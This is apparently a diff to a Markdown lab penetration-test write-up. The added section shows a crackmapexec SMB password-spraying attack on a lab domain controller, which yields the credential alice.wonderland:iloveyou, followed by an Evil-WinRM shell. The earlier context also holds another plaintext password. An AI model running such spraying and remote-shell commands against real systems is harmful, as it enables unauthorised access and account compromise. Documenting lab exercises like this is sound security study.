@@ -130,3 +130,23 @@ evil-winrm -i 192.168.50.129 -u clark.kent -p '3edcxsw2#EDCXSW@'
 *Evil-WinRM* PS C:\Users\clark.kent\Documents>
 ```
 > Shell access gained on the Domain Controller as a low-privileged user.
+
+### Technique 2: SMB Credentials Spraying Attack
+
+  After enumerating valid usernames from LDAP and RID brute-forcing, credentials spraying attack was performed to discover weak passwords in use within the domain using a custom list of passwords. 
+  
+  ```bash
+  ┌──(arllbartall㉿kali)-[~/Cyber/project1]
+  └─$ crackmapexec smb 192.168.50.129 -u users.txt -p passwords.txt     
+  SMB         192.168.50.129  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:orb.corp) (signing:True) (SMBv1:False)
+  SMB         192.168.50.129  445    DC               [+] orb.corp\alice.wonderland:iloveyou
+```
+> A valid credential was discovered: alice.wonderland : iloveyou
+
+### Shell Access using Evil-WinRM
+```bash
+  Info: Establishing connection to remote endpoint
+  *Evil-WinRM* PS C:\Users\alice.wonderland\Documents> whoami
+  orb\alice.wonderland
+  *Evil-WinRM* PS C:\Users\alice.wonderland\Documents> 
+```
